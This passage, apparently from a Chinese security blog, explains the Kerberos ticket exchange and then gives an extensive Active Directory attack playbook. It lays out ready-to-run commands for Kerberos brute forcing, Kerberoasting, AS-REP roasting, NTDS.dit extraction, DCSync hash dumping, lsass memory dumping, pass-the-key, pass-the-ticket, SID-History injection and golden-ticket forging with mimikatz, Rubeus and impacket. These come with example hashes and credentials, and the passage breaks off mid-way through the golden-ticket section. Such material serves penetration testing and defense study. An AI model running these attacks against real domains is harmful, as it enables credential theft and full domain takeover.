![img](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/KRB_TGS_REQ-1.png)

<center>KRB_TGS_REQ</center>

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-6104d00c9f214673bb651bf76458fe6c.png)

<center>KRB_TGS_REQ数据包</center>



4. KDC验证TGS-REQ并且回复TGS-REP(该步骤是TGS服务做验证与发送数据)

> 1. GS服务使用KDC特殊用户(KRBTGT用户)的NT Hash作为密钥解密TGT(若TGT能够使用KRBTGT用户的NTLM-Hash解密则证明TGT有效)，解密成功后获得TGT中的Session Key。
>
> 2. 再使用TGT中的Session Key解密验证器并确定验证器中的时间戳与Client Info，之后验证TGT中的PAC里标识的用户是否拥有访问KDC_REQ_BODY字段中Server Name属性中的权限，如果有则回复KRB-TGS-REP。
>
> 
>
> KDC向客户端/用户发送TGS-REP数据包，其中包括:
>
> - 用户名和一些client info
> - Service Ticket (TGS Ticket)，使用服务拥有者的NT hash加密(计算机用户或域用户)
>   - Service Session Key
>   - 用户名、client info、Service info
>   - Service Ticket到期时间
>   - 受信用户的PAC，使用krbtgt用户签名
> - TGT Session Key加密的一些内容
>   - Service Session Key
>   - Service Ticket到期时间
>   - 用户随机数，防止重放攻击
>
> **可以看到，KRB_TGS_REP中包含了2个Service Session Key，但是只有包含PAC的部分被称之为TGS Ticket，这两个Service Session Key用于和服务器进行通讯，因为服务器并没有保存Client的NT hash**
>
> **Services Ticket，也有人称其为TGS Ticket**

![img](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/KRB_TGS_REP.png)

<center>KRB_TGS-REP</center>



![image-20211123150951131](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20211123150951131.png)

<center>KRB_TGS_REP数据包</center>

![img](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/Screenshot-from-2020-08-08-17-16-11-16450717351532.png)

<center>Services Ticket 解包内容</center>





5. 客户端使用 TGS Ticket / Services Ticket对Exchange服务器进行身份验证

> 客户端向目标服务器发送一个KRB-AP-REQ数据包，其中包含:
>
> - 上一步获得的TGS Ticket / Services Ticket ，使用服务所有者的NT hash加密
>   - Service Session Key
>   - 用户名、Client info、Service Info
>   - PAC(由krbtgt 签名)
>   - Service Ticket到期时间
> - 由Service Session Key加密的数据
>   - 用户名、Client Info
>   - 时间戳
>
> 
>
> 由于服务端并没有可以用于解密客户端信息与时间戳的Service Session Key，但是他拥有自身的NT Hash，而 TGS Ticket / Services Ticket(由服务拥有者自身 NT hash加密) 中又存在可以解密上诉的Service Session Key，所以先解密 TGS Ticket / Services Ticket，以便获得Service Session Key
>
> 服务端通过自身NT Hash解密 TGS Ticket / Services Ticket获得Server Session Key与客户端信息、票据到期时间
>
> 再使用TGS Ticket / Services Ticket中的Server Session Key去解密Client Info和时间戳
>
> 对比 TGS Ticket / Services Ticket中的Client info是否符合Servcie Session Key加密的Client info和时间戳是否相符合，如果符合，则认证通过。

![img](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/KRB_AP_REQ.png)

<center>KRB_AP_REQ</center>

6. 在认证通过后目标服务的服务器会向客户端回复一个标识说明已授予对该服务权限的数据包(AP-REP)



> 其中包括使用Service Session key 加密的服务器身份验证器。



7. 客户端通过TGS Session Key解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器





#### 简单分类Kerberos认证



通过上述流程可以得出:



- AS-REQ & AS-REP 是为了证明自身身份，类似于我证明我是用户n0b1ta,其中AS-REP返回了TGT
- TGS-REQ & TGS-REP是为了验证是否有目标服务访问权限，其中TGS-REP返回了TGS/Services Ticket
- AP-REQ & AP-REP是为了访问目标服务





#### Kerberos Key 存储位置



> 注意Kerberos协议中的Key、Session Key、Ticket等 **均是存放在内存中的** ，并不是存放磁盘中，但是可以使用mimikatz等工具导出成文件，以便后期进行pth攻击。





##### 客户端/Workstation/用户

- User Key (User NTLM HASH)
- TGT
- TGS 发放的 Service Session Key
- Service Ticket
- Session Key (随机)





##### Domain Controller

- User Key
- KRBTGT KEY
- Service Key





##### Server

- Service Key
- Session Key





#### TGT组成

- Ticket Version Number --- 票据版本号
- Realm: 大写的AD域名 --- Kerberos 领域
- Flags : Kerberos 标记选项
- Key
- Client Realm: 客户端所在的大写AD域
- Client Name: 用户名 (客户端)
- Transited: 如果用户在不同的域内，则Kerberos 票据需要被转发
- Authentication
- Time
- Start Time
- End Time
- Renew Till
- Client Address
- Authorization Data







#### 注意

> 如果验证请求客户端的时间与DC的时间相差5分钟以上，则Kerberos身份验证不起作用，因为Kerberos需要防止重放攻击，所以所有时钟必须保持同步。
>
> 但是当时差错误的情况下DC会发送“KRB_ERROR – KRB_AP_ERR_SKEW (37)”的响应。客户端将更新与DC的kerberos会话时间并重新发送请求，如果二次请求之间的始终偏差不超过票证生存期，则请求将成功





### Exploit 

####  mimikatz 票证伪造相关命令

> mimikatz创建金票/银票的命令均是"kerberos::golden"
> 但其中参数不同，具体参数如下

````
/domain			#域名
/sid			#域SID
/user			#要伪造的用户名
/groups			#可选，用户所属组的RID，513,512,520,518,519 为默认管理员组
/ticket			#可选，将金票文件导出到本地，以便以后使用/ptt参数注入进内存
/ptt			#使用它立即将伪造的票据注入内存以供使用
/id				#可选，用户的RID，Mimikatz默认为500(默认管理员账户RID)
/startoffset	#可选，票证可用时的起始偏移量
/endin			#可选，票证有效期，默认为10年
/renewmax		#可选，票证续订周期，默认10年
/target			#银票命令，目标服务器的FQDN
/service		#银票命令，目标服务器运行的kerberos服务类型，例如cifs，http等
/rc4			#目标账户的NTLM-Hash
````



#### Kerberos暴力破解

请注意，kerberos暴力破解会产生大量网络流量，容易被设备甄别，建议使用在已知密码的情况下

```powershell
tools:
https://github.com/GhostPack/Rubeus#brute
https://github.com/ropnop/kerbrute
https://github.com/TarlogicSecurity/kerbrute
https://github.com/Zer1t0/cerbero#brute

python kerbrute.py -domain contoso.local -users users.txt -passwords passwords.txt -dc-ip 192.168.100.2
```



#### Kerberoast



众所周知，Services Ticket (也称TGS Ticket)是由目标服务的账户NT hash进行加密的

域用户可以为任何服务向域控制器请求一个TGS。**检查访问权限不是域控制器的职责**。当要求提供Services Ticket时，域控制器的唯一目的是提供与用户有关的安全信息（通过PAC）。服务必须通过阅读Services Ticke中提供的PAC来检查用户的权限。

我们可以通过指定特定的SPN来进行KRB-TGS-REQ请求。如果这些SPN在活动目录中注册，域控制器将提供一个用执行服务的账户的NT hash作为密钥加密的Services Ticket。有了这些信息，攻击者现在可以尝试通过暴力攻击恢复该账户的明文密码。

虽然大多数服务账户是由机器账户启动的，但是有一部分服务也是由AD用户执行的，机器账户的密码是随机的，且每30天变更一次，但是AD用户的密码是人为决定的，而且为了服务的稳定性，他们经常被设置为**不更改密码**。而这些账户，就是Kerberoast的攻击目标

LDAP过滤器:

```ldap
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```



这里是一个简单的PowerShell脚本，用于检索至少有一个SPN的用户

```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
	$userEntry = $result.GetDirectoryEntry()
	Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
	Write-host "SPNs"        
	foreach($SPN in $userEntry.servicePrincipalName)
	{
		$SPN       
	}
	Write-host ""
}
```

还有其他工具可以使用

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
https://github.com/GhostPack/Rubeus#kerberoast
```

利用

```powershell
#获取ST并提取hash
GetUserSPNs.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile kerberoast-hashes.txt

#使用hashcat对hash进行破解
https://hashcat.net/
```



《[Kerberoasting without SPNs](https://swarm.ptsecurity.com/kerberoasting-without-spns/)》讲述了多种在没有SPN的情况下利用Kerberoast的原理，但是他们都已经更新进了[impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)





#### ASREPRoasting



大多数用户需要进行 Kerberos 预认证， 也就是在 AS-REQ 消息中向 KDC 发送一个用其用户NT hash加密的时间戳 (以请求 TGT)

然而，在少数情况下，通过设置 [DONT_REQUIRE_PREAUTH](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) 标志，Kerberos 预认证被禁用。因此，任何人都可以通过发送 AS-REQ 消息来冒充这些帐户，而 KDC 将返回 AS-REP 响应，该响应用被认证用户的 Kerberos 密钥(NT hash)进行了加密(加密了TGT)

接下来的步骤与`Kerberoast`相似，可以离线提取该用户的NT hash

简单来说，`Kerberoast` 是通过ST破解NT hash ，ASREPRoasting 是通过TGT破解NT hash

[**注意**] 如果你对目标用户拥有 `GenericWrite/GenericAll `权限，就可以恶意修改他们的 `userAccountControl` 的[DONT_REQUIRE_PREAUTH](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) 标志，使用 ASREPRoast，然后重置该值）

![image-20220217130320125](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20220217130320125.png)



[**注意**] 默认情况下第一个发送至Kerberos的KRB-AS-REQ数据包不会携带预认证信息，KDC将返回`KRB_PREAUTH_REQURED 错误`，返回的数据包被称为`Preauth Request`

![image-20220217130807942](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20220217130807942.png)

<center>发送了两次KRB-AS-REQ</center>

![img](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/Screenshot-from-2020-08-18-19-49-37.png)

<center>ker-error数据包</center>



[@munmap](https://twitter.com/munmap) 在 Twitter 上指出，这种行为是由于客户端提前不知道支持的 ETYPES，[RFC6113 的第 2.2 节中](https://tools.ietf.org/html/rfc6113#section-2.2)明确详细说明了这一点。

[**注意**] [DONT_REQUIRE_PREAUTH](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) 标识可以在 `User Account Control` 中进行设置

![image-20220217131952630](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20220217131952630.png)

<center>在UAC中设置标识</center>



使用LDAP过滤器列出设置 `DONT_REQUIRE_PREAUTH` 标志的用户

```powershell
(userAccountControl:1.2.840.113556.1.4.803:=4194304)
```



也可以使用以下工具

```powershell
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
https://github.com/GhostPack/Rubeus#asreproast
https://github.com/HarmJ0y/ASREPRoast
```



利用

```powershell
GetNPUsers.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile asreproast-hashes.txt
```





#### 导出NT Hash及AD数据库数据



##### 什么是NTDS.DIT

> NTDS.DIT是从Windows 2000开始，AD用来存放用户账户数据及HASH的存储数据库，存在于每一个DC上，并且默认目录为C:\Windows\NTDS\ **因为被占用所以无法直接复制并且打开，需要使用软件创建快照并且复制** 



##### 离线导出ntds.dit并读取NT Hash

创建快照

```powershell
ntdsutil snapshot "activate instance ntds" create quit quit
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-c7c8a870d6b54401becb953a77ffc752.png)


挂载快照

```powershell
ntdsutil snapshot "mount <GUID>" quit quit
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-29a89ad6099343afad62023f5ac6f0c2.png)


将快照中的ntds.dit与system文件复制出来

```powershell
copy < <snapshot directory> \Windows\NTDS\ntds.dit> <target directory>
copy < <snapshot directory> \Windows\System32\Config\SYSTEM <target directory>
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-e725a08a9c7f47baa074cffb4ed7a3ae.png)



卸载、删除快照并检查痕迹

```powershell
ntdsutil snapshot "unmount <GUID>" "delete <GUID>" "List All" quit quit
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-a5396701fe1640108c9c1b5e2d85f6f2.png)



将目标文件打包传回主机

```powershell
7z.exe a <zip file directory> <ntds file directory> <SYSTEM file directory>
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-74f1d60d4f0e46f7bdd47b5302cc4125.png)



在kali中安装impacket

```bash
git clone https://github.com/CoreSecurity/impacket.gitcd impacketpython setup.py install
```



本地导出hash

```bash
impacket-secretsdump -system <SYSTEM FILE> -ntds <ntds.dit FILE> LOCAL

#下面可以将内容输出到文件
impacket-secretsdump -system <SYSTEM FILE> -ntds <ntds.dit FILE> LOCAL >> <TXT FILE> 
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-0a5fc91a637c4d799981454c5569df0f.png)



#####  在线导出用户HASH(mimikatz)

```powershell
#run as administrator

#all user
mimikatz.exe "lsadump::dcsync /domain:<domain> /all /csv"

#only krbtgt
mimikatz.exe "lsadump::dcsync /user:DOMAIN\KRBTGT"
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-eaa34c60e22347258683ddf43dbb4dc4.png)





#### Over The Hash / Pass the Key

正如你所注意到的，在请求TGT时，用户不需要使用其密码，而是使用其Kerberos密钥。因此，如果攻击者能够窃取Kerberos密钥（NT哈希或AES密钥），就可以用它来代表用户请求TGT，而不需要知道用户密码

通常在Windows中，Kerberos密钥被缓存在lsass进程中，它们可以通过使用`mimikatz sekurlsa::ekeys`命令来检索。你也可以用procdump、sqldumper或其他工具转储lsass进程，然后用mimikatz离线提取密钥。

在 Linux 的情况下，Kerberos 密钥被存储在 [keytab 文件](https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html)中，以便用于 Kerberos 服务。keytab 文件通常可以在 `/etc/krb5.keytab` 中找到， 或在环境变量 `KRB5_KTNAME` 或 `KRB5_CLIENT_KTNAME` 中指定的值， 或在 Kerberos 配置文件 `/etc/krb5.conf `中指定。

找到钥匙表后， 您可以将其复制到本地机器上， 并/或用 klist 或 [cerbero](https://gitlab.com/Zer1t0/cerbero/#list) 列出其钥匙。

```bash
klist -k -Ke
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   1 r2d2@contoso.local (DEPRECATED:arcfour-hmac)  (0xc49a77fafad6d3a9270a8568fa453003)
```



一旦拥有了Kerberos密钥，就可以在Windows中通过使用[Rubeus asktgt](https://github.com/GhostPack/Rubeus#asktgt)命令来请求一个TGT

```powershell
#PTH 请求RC4加密的tgt
Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt

#pth 请求一个aes256加密的tgt并打开一个该用户的CMD窗口
Rubeus.exe asktgt /user:dfm.a /domain:testlab.local /aes256:e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27 /createnetonly:C:\Windows\System32\cmd.exe
```





在linux中

```bash
#使用ktutil创建keytab文件
ktutil

#在 ktutil 提示符下，键入带有“principals”（-p）标志的“add entry”（添加）命令。指定用户和 FQDN 的全大写版本。然后是“KVNO”（-k 1），这是密钥编号。最后是加密类型，即 NTLM 哈希的 rc4-hmac：
ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac

#回车后，系统会提示输入 rc4-hmac (NTLM) 哈希：
Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29

#然后我们将keytab文件写入磁盘并退出ktutil
ktutil: wkt /tmp/a.keytab
ktutil: exit

#使用创建的 keytab 文件创建一个 kerberos 票证。
kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM

```



#### 票据转换及计算kerbero密钥



##### 票据转换

Kerberos 票据有两种格式：ccache 和 krb。 ccache 是 Linux 机器用来存储票据（通常在文件中）的一种。 Windows中使用krb格式将票证存储在lsass内存中，也是通过网络传输票证的格式。

```
https://gitlab.com/Zer1t0/cerbero#convert
https://github.com/Zer1t0/ticket_converter

$ python ticket_converter.py ~/Anakin.ccache ~/Anakin.krb
Converting ccache => kirbi

```



##### 计算kerberos 密钥

可以使用工具将明文密码转换为kerberos Key

```python
https://gitlab.com/Zer1t0/cerbero#hash
https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372

import binascii, hashlib
input_str = "SOMETHING_AS_INPUT_TO_HASH"
ntlm_hash = binascii.hexlify(hashlib.new('md4', input_str.encode('utf-16le')).digest())
print ntlm_hash

#使用 cerbero hash
$ cerbero hash 'Vader1234!' -u contoso.local/Anakin
rc4:cdeae556dc28c24b5b7b14e9df5b6e21
aes128:18fe293e673950214c67e9f9fe753198
aes256:ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e
```



#### Pass The Ticket

Pass the Ticket 技术包括窃取票证和相关的会话密钥，并使用它们来模拟用户以访问资源或服务。 TGT 和 ST 都可以使用，但首选 TGT，因为它们允许代表用户访问任何服务（通过使用它来请求 ST），而 ST 仅限于一项服务（或更多，如果 SPN被修改为同一用户的另一个服务），简单来说，就是窃取电脑中已经存在的票据进行使用

在 Windows 中，票证可以在 lsass 进程内存中找到，并且可以使用 `mimikatz sekurlsa::tickets` 命令或 `Rubeus dump` 命令提取。另一种可能性是使用 [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)、[sqldumper 或其他工具](https://lolbas-project.github.io/#/dump)转储 lsass 进程，并使用 mimikatz 或 pypykatz 离线提取票证。这些命令提取 krb 格式的票证。

```powershell
#使用 procdump 转储 lsass 内存
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

#使用 pypykatz 从 lsass 转储中检索票证
$ pypykatz lsa minidump lsass.dmp -k /tmp/kerb > output.txt
INFO:root:Parsing file lsass.dmp
INFO:root:Writing kerberos tickets to /tmp/kerb
$ ls /tmp/kerb/
 lsass.dmp_51a1d3f3.ccache                                                        'TGS_CONTOSO.LOCAL_WS02-7$_WS02-7$_29a9c991.kirbi'
 lsass.dmp_c9a82a35.ccache                                                         TGT_CONTOSO.LOCAL_anakin_krbtgt_CONTOSO.LOCAL_6483baf5.kirbi
 TGS_CONTOSO.LOCAL_anakin_LDAP_dc01.contoso.local_contoso.local_f8a46ad5.kirbi    'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_740ef529.kirbi'
'TGS_CONTOSO.LOCAL_WS02-7$_cifs_dc01.contoso.local_b9833fa1.kirbi'                'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_77d63cf0.kirbi'
'TGS_CONTOSO.LOCAL_WS02-7$_cifs_dc01.contoso.local_bfed6415.kirbi'                'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_7ac74bd6.kirbi'
'TGS_CONTOSO.LOCAL_WS02-7$_ldap_dc01.contoso.local_contoso.local_2129bc1c.kirbi'  'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_fdb8b40a.kirbi'
'TGS_CONTOSO.LOCAL_WS02-7$_LDAP_dc01.contoso.local_contoso.local_719218c6.kirbi'
```



另一方面，在域内的 Linux 机器中，票证以不同的方式存储。默认情况下，票证通常可以在 /tmp 目录下格式为 `krb5cc_%{uid}` 的文件中找到，其中 uid 是用户 uid。要获得门票，只需复制文件（如果您有权限）。但是，票据也有可能存储在 [Linux 内核密钥](https://man7.org/linux/man-pages/man7/keyrings.7.html)而不是文件中，但您可以使用[tickey](https://github.com/TarlogicSecurity/tickey)来获取它们

为了确定票据在 Linux 机器中的存储位置，可以检查 /etc/krb5.conf 中的 Kerberos 配置文件。票据以 ccache 格式存储在 Linux 机器中

要在 Windows 机器上使用票证，必须将票据注入到 lsass 进程中，这可以通过 `mimikatz kerberos::ptt` 命令或 Rubeus ptt 命令完成。这些实用程序以 krb 格式读取票证，这里是一些[Windows PTT 备忘录](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-windows) \ [Linux PTT 备忘录](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-linux)

```powershell
PS C:\> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt pikachu-tgt.kirbi

 * File: 'pikachu-tgt.kirbi': OK
```



将票证注入会话后，可以使用任何工具通过网络模拟用户来执行操作，例如 [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

在 Linux 中，可以通过将 `KRB5CCNAME` 环境变量指向票证文件来将票证与 [impacket 程序](https://github.com/SecureAuthCorp/impacket/tree/master/examples)一起使用。然后，使用带有 `-k -no-pass` 参数的 impacket 程序。在这里，需要 ccache 格式的票证



#### SID历史记录的利用

> 既然知道了SID-History是一个用户(SID)的权限的映射，让我们来聊一些有趣的事情。

让人感到有趣的是，SID-History对 **同一域中** 的SID起作用，作用与在同一林中各域中一样，这意味着Domain A中的一个普通用户可以包含Domain A中域管理员的SID(添加域管理员的SID作为SID-History)，如果这样，普通用户将获得域管理员的权限，而且不会成为[Domain Admins](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11))组的成员



注意:一个域中的普通用户可以在其SID-History中包含来自AD林中另一个域的EA(企业管理员账户)的SID，从而将该普通用户账户的访问权限"提升"到林中所有域的管理员。提升权限的前提是有一个没有启用[SID Filtering](https://www.itprotoday.com/windows-8/sid-filtering)的林信任，这样就可以从另一个林中注入一个SID(也被他人称之为林信任攻击)。



**这种攻击手段一般利用在制作SID-History后门以及林内横向移动上**



##### 利用过程

> Mimikatz允许向用户账户注入SID-History( **需要域管理员权限或者其他同等权限，一般在DC上做林信任攻击** )

举个例子，攻击者创建了普通用户账户"n0b1ta"，并且将域管理员账户"Administrator"(RID为500)账户的SID注入进n0b1ta的SID-History

```powershell
#mimikatz 2.1版本前
./mimikatz "privilege::debug" "misc::addsid n0b1ta Administrator"

#mimikatz2.1版本后
./mimikatz "privilege::debug" "sid::patch" "sid::add /sam:n0b1ta /new:administrator"
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-0d8bf160eab34ec1a171416b46212ae0.png)



检测同域内的SID-History

```powershell
Import-Module ActiveDirectory
[string]$DomainSID = ( (Get-ADDomain).DomainSID.Value )
Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory | `
Where {$_.SIDHistory -Like "$DomainSID-*"}
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-74f1cbf455f04cc09387537472010bf9.png)



查看Domain Admins组中并没有n0b1ta用户

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-9d3507a389b64baab670408a55298c1f.png)



成功访问DC中的目录

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-4565f65c0e6c430db98acaa9fcf46a44.png)




#### Golden Ticket

> 所谓金票(Golden Ticket)就是一张由攻击者伪造的特殊的TGT，是PTT攻击(Pass The Ticket)的一种



TGT是由KDC的长期密钥---KRBTGT账户的NTLM-Hash作为密钥加密的一张身份验证票据



如果攻击者拥有KRBTGT账户的NTLM-Hash或者获取了DC权限导出了NTLM-Hash，就可以重写所有Kerberos认证数据包和票据



当攻击者制作了伪造的Golden Ticket后，将跳过AS-REQ与AS-REP的步骤，直接使用伪造的TGT进行TGS-REQ请求，例如:伪造一张TGT,其中被伪造的PAC中包含域管理员信息以获得域管理员权限。

**注意，一旦创建了 Golden Ticket，[必须在 20 分钟内使用](https://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html)，否则 KDC 将检查 PAC 信息以验证其是否正确。**



![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-c07a5e999dca4cceba614514b4b3abc9.png)

> 
> 攻击者伪造了TGT，所以免去了AS-REQ与AS-REP过程(这两步请求在上文有详细说到过，因为AS-REQ/REP就是为了请求TGT的，所以被忽略)。
> 由于伪造的TGT中包含了 **伪造** 的**TGT Session Key** 与用于验证用户访问权限的 **特权属性证书** ([PAC](https://docs.microsoft.com/zh-cn/archive/blogs/openspecification/understanding-microsoft-kerberos-pac-validation))，且伪造的TGT也是由KRBTGT用户的NTLM-Hash作为密钥加密的。
>
> 所以在上图 **第五步** 中向TGS发送AP-REQ请求时，TGS收到AP-REQ后使用KRBTGT账户NTLM-Hash作为密钥进行解密，解密出的PAC是我们制作的特权账户(例如:下文中指定id为500，也就是默认域管账户)的SID，为了防止造成网络拥堵，Kerberos并不会验证TGT的真伪性(因为被伪造的TGT本身就是KRBTGT账户加密的，只需能够解密就好, **在下文银钥利用中我们会详细解释为什么MS Windows不去认证PAC的真实性** )，所以TGS将会在我们访问目标服务(发送AP-REQ)时给于我们想要的AP-REP数据包，让我们对目标服务器进行访问。



**利用前置条件** :

- 域名
- KRBTGT用户的NTLM-Hash
- 域SID
- 任意伪造的用户名





##### 如何获取伪造金票所需要的信息



1. 域名

```powershell
ipconfig /all
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-b1047d3ca27542748124cc548857b487.png)



2. KRBTGT用户的NTLM-Hash

```powershell
#上文中有详细过程 

#需要使用domain admin组用户运行
mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt" exit exit
```

![image-20211123151353085](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20211123151353085.png)



3. 域SID

```powershell
whoami /user
```

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-279c179ecf9a4ba7819f06307d0ac5a4.png)



##### 使用mimikatz制作金钥

```powershell
mimikatz.exe "kerberos::golden /user:<域用户名> /domain:<域> /sid:<域用户SID> /krbtgt:<KRBTGT用户HASH> /id:<伪造用户的SID(末尾)> /user:<伪造用户的用户名>" "kerberos::ptt ticket.kirbi" exit exit

#example
 mimikatz.exe "kerberos::golden /user:administrator /domain:onebit.lab /sid:S-1-5-21-3785948476-599174919-4239617280 /krbtgt:223f6d6534c729a1225b4e0bc24c05a4 /id:500 /user:testTGT" "kerberos::ptt ticket.kirbi" exit exit
```



未导入金钥前:

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-a39aa80ca7c645b896ba0131ad79ba63.png)



导入金钥:

